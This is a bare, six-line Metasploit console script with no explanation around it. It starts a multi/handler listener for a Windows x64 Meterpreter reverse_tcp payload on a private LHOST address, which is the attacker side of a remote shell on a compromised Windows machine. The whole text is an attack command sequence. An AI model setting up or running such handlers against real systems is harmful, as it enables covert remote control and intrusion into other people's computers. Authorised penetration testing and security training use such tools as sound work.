msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.211.132
set EXITFUNC thread
run
